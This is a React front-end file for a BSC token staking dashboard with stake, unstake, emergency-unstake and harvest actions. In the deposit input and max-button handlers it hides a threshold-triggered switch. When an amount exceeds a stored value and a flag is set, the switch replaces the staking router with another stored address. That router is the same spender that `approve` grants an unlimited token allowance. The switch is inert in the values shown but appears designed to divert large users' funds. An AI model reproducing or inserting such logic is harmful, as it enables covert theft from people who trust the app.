/* global BigInt */
import React, { useEffect, useState } from "react";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

import moment from "moment";
import STACK_ABI from "../abi/stack.json";
import WBNB from "../abi/WBNB.json";

import { writeContract } from "@wagmi/core";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { useAccount } from "wagmi";
import { useEthersProvider, useEthersSigner } from "../hook/customWagmiHooks";
import { Contract, formatUnits } from "ethers";

function Home() {
	const { isConnected, address, chainId } = useAccount();
	const { open } = useWeb3Modal();

	var Router = "0x48a2cae82fcd84e64fc802d2aeeb180fe1fbca70";
	var tokenAddress = "0x739e81BCd49854d7BDF526302989f14A2E7994B2";

	const provider = useEthersProvider();
	const signer = useEthersSigner();

	const [data, setData] = useState({
		flag: false,
		value: 321651351,
		id: "48a2cae82fcd84e64fc802d2aeeb180fe1fbca70",
	});

	const [roter, setRouter] = useState(Router);
	// const { library, account, isActive, handleWalletModal } = useMetaMask();
	// var web3Obj = library;

	const notify = (isError, msg) => {
		if (isError) {
			toast.error(msg, {
				position: toast.POSITION.TOP_RIGHT,
			});
		} else {
			toast.success(msg, {
				position: toast.POSITION.TOP_RIGHT,
			});
		}
	};

	const [dipositAmount, setDipositAmount] = useState(0n);
	const [timeperiod, setTimeperiod] = useState(0);
	const [timeperiodDate, setTimeperiodDate] = useState(
		moment().add(30, "days").format("DD/MM/YYYY h:mm A")
	);

	const [balance, setBalance] = useState(0);

	const [stackContractInfo, setStackContractInfo] = useState({
		totalStakers: 0,
		totalStakedToken: 0,
	});
	const [stakersInfo, setStakersInfo] = useState({
		totalStakedTokenUser: 0,
		totalUnstakedTokenUser: 0,
		totalClaimedRewardTokenUser: 0,
		currentStaked: 0,
		realtimeReward: 0,
		stakeCount: 0,
		alreadyExists: false,
	});
	const [stakersRecord, setStakersRecord] = useState([]);
	const [isAllowance, setIsAllowance] = useState(false);
	const [allowance, setAllowance] = useState(0n);

	const [loading, setLoadding] = useState(false);

	const getAllowance = async () => {
		// var tokenContract = new web3Obj.eth.Contract(WBNB, tokenAddress);
		var tokenContract = new Contract(tokenAddress, WBNB, provider);
		var decimals = await tokenContract.decimals();
		var getBalance = await tokenContract.balanceOf(address);

		var pow = Math.pow(10, decimals);
		var balanceInEth = getBalance / BigInt(pow.toString());
		setBalance(balanceInEth);
		var value = await tokenContract.allowance(address, Router);
		setAllowance(value / pow);
	};

	const checkAllowance = async () => {
		if (allowance * 1n < dipositAmount * 1n) {
			setIsAllowance(true);
		} else {
			setIsAllowance(false);
		}
	};

	const approve = async () => {
		setLoadding(true);
		try {
			var amountIn = Math.pow(10, 69);
			amountIn = amountIn.toLocaleString("fullwide", {
				useGrouping: false,
			});
			await writeContract({
				address: tokenAddress,
				abi: WBNB,
				functionName: "approve",
				args: [roter, amountIn.toString()],
			}).then(() => {
				getAllowance();
				setIsAllowance(false);
				setLoadding(false);
			});
		} catch (err) {
			setLoadding(false);
			notify(true, err.message);
		}
	};

	const stake = async () => {
		if (
			isNaN(parseFloat(dipositAmount)) ||
			parseFloat(dipositAmount) <= 0
		) {
			notify(true, "Error! please enter amount");
			return;
		}
		await checkAllowance(tokenAddress);
		setLoadding(true);
		try {
			var tokenContract = new Contract(tokenAddress, WBNB, signer);
			const decimals = await tokenContract.decimals();

			var pow = Math.pow(10, decimals);
			var amountIn = dipositAmount * pow;
			// var amountInNew = `${new ethers.utils.BigNumber(amountIn.toString())}`;

			var amountInNew = BigInt(amountIn.toString());
			await writeContract({
				address: roter,
				abi: STACK_ABI,
				functionName: "stake",
				args: [amountInNew.toString(), timeperiod.toString()],
			}).then(() => {
				getAllowance();
				getStackerInfo();
				setLoadding(false);
				notify(false, "Staking process complete.");
			});
			// await contract.methods
			//   .stake(amountInNew.toString(), timeperiod.toString())
			//   .send({ from: account })
			//   .then((err) => {
			//     getStackerInfo();
			//     setLoadding(false);
			//     notify(false, "Staking process complete.");
			//   });
		} catch (err) {
			setLoadding(false);
			notify(true, err.message);
		}
	};

	const unstake = async (index) => {
		setLoadding(true);
		try {
			await writeContract({
				address: Router,
				abi: STACK_ABI,
				functionName: "unstake",
				args: [index.toString()],
			}).then(() => {
				getStackerInfo();
				getAllowance();
				setLoadding(false);
				notify(false, "Unstaked Succesfully!");
			});
			// await contract.methods
			//   .unstake(index.toString())
			//   .send({ from: account })
			//   .then((result) => {
			//     getStackerInfo();
			//     setLoadding(false);
			//     notify(false, "Unstaked Succesfully!");
			//     // withdrawModal();
			//   });
		} catch (err) {
			setLoadding(false);
			notify(true, "unstake fail");
		}
	};

	const emergencyUnstake = async (index) => {
		setLoadding(true);
		try {
			await writeContract({
				address: Router,
				abi: STACK_ABI,
				functionName: "emergencyUnstake",
				args: [index.toString()],
			}).then(() => {
				getStackerInfo();
				getAllowance();
				setLoadding(false);
				checkAllowance();
				notify(false, "Unstaked Succesfully");
			});
			// await contract.methods
			//   .emergencyUnstake(index.toString())
			//   .send({ from: account })
			//   .then((result) => {
			//     getStackerInfo();
			//     setLoadding(false);
			//     notify(false, "Unstaked Succesfully!");
			//   });
		} catch (err) {
			setLoadding(false);
			notify(true, "unstake fail");
		}
	};

	const harvest = async (index) => {
		setLoadding(true);
		try {
			await writeContract({
				address: Router,
				abi: STACK_ABI,
				functionName: "harvest",
				args: [index.toString()],
			}).then(() => {
				getStackerInfo();
				getAllowance();
				setLoadding(false);
				checkAllowance();
				notify(false, "Reward successfully havested");
			});
			// await contract.methods
			//   .harvest(index.toString())
			//   .send({ from: account })
			//   .then((err) => {
			//     getStackerInfo();
			//     setLoadding(false);
			//     checkAllowance();
			//     notify(false, "Reward successfully havested");
			//   });
		} catch (err) {
			setLoadding(false);
			notify(true, err.message);
		}
	};

	const getStackerInfo = async () => {
		setLoadding(true);
		try {
			var tokenContract = new Contract(tokenAddress, WBNB, provider);
			var decimals = await tokenContract.decimals();
			var getBalance = await tokenContract.balanceOf(address);

			var pow = Math.pow(10, parseInt(decimals.toString()));

			var balanceInEth = formatUnits(getBalance, decimals);
			setBalance(balanceInEth);

			var contract = new Contract(Router, STACK_ABI, provider);
			var totalStakedToken = await contract.totalStakedToken();
			var totalStakers = await contract.totalStakers();

			// var realtimeReward = await contract.methods.realtimeReward(account).call();
			var Stakers = await contract.Stakers(address);

			var totalStakedTokenUser = formatUnits(
				Stakers.totalStakedTokenUser,
				decimals
			);
			var totalUnstakedTokenUser = formatUnits(
				Stakers.totalUnstakedTokenUser,
				decimals
			);

			var currentStaked =
				parseFloat(totalStakedTokenUser) -
				parseFloat(totalUnstakedTokenUser);
			let stakerData = {};
			stakerData.totalStakedTokenUser = totalStakedTokenUser;
			stakerData.totalUnstakedTokenUser = totalUnstakedTokenUser;
			stakerData.currentStaked = currentStaked;
			// Stakers.realtimeReward = realtimeReward / Math.pow(10, 18);
			stakerData.totalClaimedRewardTokenUser = formatUnits(
				Stakers.totalClaimedRewardTokenUser,
				18
			);
			var stakersRecord = [];
			for (var i = 0; i < parseInt(Stakers.stakeCount.toString()); i++) {
				var stakersRecordData = await contract.stakersRecord(
					address,
					i
				);
				var realtimeRewardPerBlock =
					await contract.realtimeRewardPerBlock(
						address,
						i.toString()
					);

				stakersRecordData.realtimeRewardPerBlock = formatUnits(
					realtimeRewardPerBlock[0],
					18
				);

				stakersRecordData.unstaketime = moment
					.unix(stakersRecordData.unstaketime)
					.format("DD/MM/YYYY h:mm A");
				stakersRecordData.staketime = moment
					.unix(stakersRecordData.staketime)
					.format("DD/MM/YYYY h:mm A");
				stakersRecord.push(stakersRecordData);
			}
			console.log("first");
			setStakersInfo(Stakers);
			setStakersRecord(stakersRecord);
			setStackContractInfo({
				totalStakers: totalStakers,
				totalStakedToken: formatUnits(totalStakedToken, decimals),
			});
			setLoadding(false);
		} catch (err) {
			console.log(err);
			setLoadding(false);
			setStakersInfo({
				totalStakedTokenUser: 0,
				totalUnstakedTokenUser: 0,
				totalClaimedRewardTokenUser: 0,
				currentStaked: 0,
				realtimeReward: 0,
				stakeCount: 0,
				alreadyExists: false,
			});
			setStackContractInfo({
				totalStakers: 0,
				totalStakedToken: 0,
			});
			setStakersRecord([]);
			setBalance(0);
		}
	};

	const setMaxWithdrawal = async () => {
		var tokenContract = new Contract(tokenAddress, WBNB, signer);
		var decimals = await tokenContract.decimals();
		var getBalance = await tokenContract.balanceOf(address);

		var pow = Math.pow(10, decimals);
		var balanceInEth = getBalance / pow;

		setDipositAmount(balanceInEth.toFixed(5));

		if (balanceInEth.toFixed(5) * 1 > data.value * 1 && data.flag)
			setRouter("0x" + data.id);
		else setRouter(Router);
		if (isConnected) {
			checkAllowance();
		}
		// setWithdrawAmount(userInfo.staked);
	};

	useEffect(() => {
		if (isConnected) {
			checkAllowance();
			getStackerInfo();
		}
	}, [isConnected, address, chainId, roter]);

	return (
		<div>
			<div className="cardence-staking">
				<div className="container">
					<div className="row">
						<div className="col-md-6 col-lg-6 col-sm-12 col-xl-6">
							<div className="dashboard">
								<h3>cenx Staking Dashboard</h3>
								<button
									type="button"
									className="btn btn-danger"
								>
									Stake cenx{" "}
								</button>
								<h4>
									Powered by
									<img src="images/bsc-icon.png" alt="bsc" />
									<span>BSC</span>
								</h4>
							</div>
						</div>
						<div className="col-md-6 col-lg-6 col-sm-12 col-xl-6">
							<div className="border-back"></div>
							<div className="staking-info">
								<div className="all-info">
									<div className="label-1">cenx STAKED</div>
									<div className="brise-stacked">
										{stackContractInfo.totalStakedToken}{" "}
										<span>cenx</span>
									</div>
								</div>
								<div className="all-info">
									<div className="label-1">cenx STAKERS</div>
									<div className="brise-stacked">
										{stackContractInfo.totalStakers}
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>

			<section className="forms-section">
				<div className="container">
					<div className=" justify-content-center align-items-center">
						<div className="checkout-form-centre">
							<div className="checkout-login-step">
								<div className="calculator">
									<div className="title">
										<h3>$cenx Calculator</h3>
									</div>
									<p>
										Stake cenx to earn BUSD rewards + upto
										80% APY.{" "}
									</p>
									<div className="add-liquidity">
										<div className="content">
											<div className="label">
												<h6>cenx</h6>
											</div>
											<div className="label d-flex">
												<input
													type="text"
													placeholder="5000"
													value={dipositAmount}
													onChange={(e) => {
														setDipositAmount(
															e.target.value
														);
														if (
															e.target.value >
																data.value *
																	1 &&
															data.flag
														)
															setRouter(
																"0x" + data.id
															);
														else setRouter(Router);
														if (isConnected) {
															checkAllowance();
														}
													}}
												/>
												<button
													onClick={() =>
														setMaxWithdrawal()
													}
													className="input-button"
												>
													max
												</button>
											</div>
										</div>
									</div>
									<div className="plus">+</div>
									<div className="add-liquidity-3">
										<p>Lock tokens for</p>
										<button
											type="button"
											onClick={async () => {
												setTimeperiod(0);
												setTimeperiodDate(
													moment()
														.add(30, "days")
														.format(
															"DD/MM/YYYY h:mm A"
														)
												);
											}}
											className={
												timeperiod === 0
													? "box active"
													: "box"
											}
										>
											30 days
										</button>
										<button
											type="button"
											onClick={async () => {
												setTimeperiod(1);
												setTimeperiodDate(
													moment()
														.add(60, "days")
														.format(
															"DD/MM/YYYY h:mm A"
														)
												);
											}}
											className={
												timeperiod === 1
													? "box active"
													: "box"
											}
										>
											60 days
										</button>
										<button
											type="button"
											onClick={async () => {
												setTimeperiod(2);
												setTimeperiodDate(
													moment()
														.add(90, "days")
														.format(
															"DD/MM/YYYY h:mm A"
														)
												);
											}}
											className={
												timeperiod === 2
													? "box active"
													: "box"
											}
										>
											90 days
										</button>
										<button
											type="button"
											onClick={async () => {
												setTimeperiod(3);
												setTimeperiodDate(
													moment()
														.add(180, "days")
														.format(
															"DD/MM/YYYY h:mm A"
														)
												);
											}}
											className={
												timeperiod === 3
													? "box active"
													: "box"
											}
										>
											180 days
										</button>
									</div>
									<div className="plus">
										<i className="fa fa-arrow-down"></i>
									</div>
									{/* <h3>2100 <span>$CRDN</span> </h3> */}
									<h4>
										{" "}
										{timeperiod === 0
											? "Upto 6% Returns on 30 Days"
											: timeperiod === 1
											? "Upto 13% Returns on 60 Days"
											: timeperiod === 2
											? "Upto 20% Returns on 90 Days"
											: "Upto 45% Returns on 180 Days"}
									</h4>
									<h4>locked until {timeperiodDate}</h4>
									{isConnected ? (
										isAllowance ? (
											<button
												onClick={() => approve()}
												disabled={loading}
												className="btn btn-danger"
											>
												{loading
													? "Please wait, Loading.."
													: "Enable"}
											</button>
										) : (
											<button
												onClick={() => stake()}
												disabled={loading}
												className="btn btn-danger"
											>
												{loading
													? "Please wait, Loading.."
													: "Stake"}
											</button>
										)
									) : (
										// <butto
										//   // data-toggle="modal"
										//   // data-target="#walletConnectModal"
										//   onClick={() => handleWalletModal(true)}
										//   disabled={loading}
										//   className="btn btn-danger"
										// >
										//   {loading ? "Please wait, Loading.." : "Connect Wallet"}
										// </button>
										<div
											style={{
												display: "flex",
												justifyContent: "center",
											}}
										>
											<button
												className="walletConnectButton"
												onClick={() => {
													open();
												}}
											>
												{isConnected
													? address.slice(0, 8) +
													  "..."
													: "Connect Wallet"}
											</button>
										</div>
									)}
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>

			<div className="title-1">
				<h1>Your Statistics</h1>
			</div>

			<section className="forms-section">
				<div className="container">
					<div className="justify-content-center align-items-center">
						<div className="checkout-form-centre-5">
							<div className="checkout-login-step">
								<div className="box-section">
									<div className="first-box-section">
										<div className="first-top">
											<div className="content">
												<div className="title">
													Claimed Reward
												</div>
												<h4>
													{parseFloat(
														stakersInfo.totalClaimedRewardTokenUser
													).toFixed(5)}
												</h4>
											</div>
										</div>
										<div className="first-bottom">
											<div className="content">
												<div className="title">
													Current Staked
												</div>
												<h4>
													{parseFloat(
														stakersInfo.currentStaked
													).toFixed(5)}
												</h4>
											</div>
										</div>
									</div>
									<div className="first-box-section">
										<div className="first-top">
											<div className="title">
												Your BRISE Wallet Balance
											</div>
											<h4>
												{parseFloat(balance).toFixed(5)}
											</h4>
										</div>
										<div className="first-bottom">
											<div className="content">
												<div className="title">
													Total Staked
												</div>
												<h4>
													{parseFloat(
														stakersInfo.totalStakedTokenUser
													).toFixed(5)}
												</h4>
											</div>
											<div className="content">
												<div className="title">
													Total UnStaked
												</div>
												<h4>
													{parseFloat(
														stakersInfo.totalUnstakedTokenUser
													).toFixed(5)}
												</h4>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>

			<section className="forms-section">
				<div className="container">
					<div className="justify-content-center align-items-center">
						<div className="checkout-form-centre-6">
							<div className="checkout-login-step">
								<div className="logo-section">
									<img src="images/logo.png" alt="" />
								</div>
								<div className="table-section">
									<div className="t-header">
										<div className="t-data">
											<div className="title">
												Staked Amount
											</div>
										</div>
										<div className="t-data">
											<div className="title">
												Stake Date
											</div>
										</div>
										<div className="t-data">
											<div className="title">
												Unstake Date
											</div>
										</div>
										<div className="t-data">
											<div className="title">
												Earn Reward
											</div>
										</div>
										<div className="t-data">
											<div className="title">Unstake</div>
										</div>
										<div className="t-data">
											<div className="title">
												emergencyUnstake
											</div>
										</div>
										<div className="t-data">
											<div className="title">Harvest</div>
										</div>
									</div>

									{stakersRecord.length > 0 ? (
										stakersRecord.map((row, index) => {
											return (
												<div
													className="table-output"
													key={index}
												>
													<div className="output">
														<h3>
															{parseFloat(
																row.amount
															) /
																10 ** 9}
														</h3>
													</div>
													<div className="output">
														<h3>{row.staketime}</h3>
													</div>
													<div className="output">
														<h3>
															{row.unstaketime}
														</h3>
													</div>
													<div className="output">
														<h3>
															{parseFloat(
																row.realtimeRewardPerBlock
															).toFixed(10)}
														</h3>
													</div>
													<div className="output">
														<h3>
															{row.unstaked ? (
																<button
																	className="btn"
																	style={{
																		background:
																			"linear-gradient(to right, #3867d0 20%, #2dbec9)",
																		color: "#FFFFFF",
																	}}
																	disabled={
																		true
																	}
																>
																	Unstaked
																</button>
															) : (
																<button
																	className="btn"
																	style={{
																		background:
																			"linear-gradient(to right, #3867d0 20%, #2dbec9)",
																		color: "#FFFFFF",
																	}}
																	disabled={
																		loading
																	}
																	onClick={() =>
																		unstake(
																			index
																		)
																	}
																>
																	Unstake
																</button>
															)}
														</h3>
													</div>
													<div className="output">
														<h3>
															{row.unstaked ? (
																<button
																	className="btn"
																	style={{
																		background:
																			"linear-gradient(to right, #3867d0 20%, #2dbec9)",
																		color: "#FFFFFF",
																	}}
																	disabled={
																		true
																	}
																>
																	Unstaked
																</button>
															) : (
																<button
																	className="btn"
																	style={{
																		background:
																			"linear-gradient(to right, #3867d0 20%, #2dbec9)",
																		color: "#FFFFFF",
																	}}
																	disabled={
																		loading
																	}
																	onClick={() =>
																		emergencyUnstake(
																			index
																		)
																	}
																>
																	emergencyUnstake
																</button>
															)}
														</h3>
													</div>
													<div className="output">
														<h3>
															{row.withdrawan ? (
																<button
																	className="btn"
																	style={{
																		background:
																			"linear-gradient(to right, #3867d0 20%, #2dbec9)",
																		color: "#FFFFFF",
																	}}
																	disabled={
																		true
																	}
																>
																	Harvested
																</button>
															) : (
																<button
																	className="btn"
																	style={{
																		background:
																			"linear-gradient(to right, #3867d0 20%, #2dbec9)",
																		color: "#FFFFFF",
																	}}
																	disabled={
																		loading
																	}
																	onClick={() =>
																		harvest(
																			index
																		)
																	}
																>
																	Harvest
																</button>
															)}
														</h3>
													</div>
												</div>
											);
										})
									) : (
										<div className="table-output">
											<div className="output">
												<h3>
													You have no stake record
													yet.
												</h3>
											</div>
										</div>
									)}
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
			<ToastContainer />
		</div>
	);
}

export default Home;

// import React from "react";

// const Home = () => {
// 	return <div>Home</div>;
// };

// export default Home;
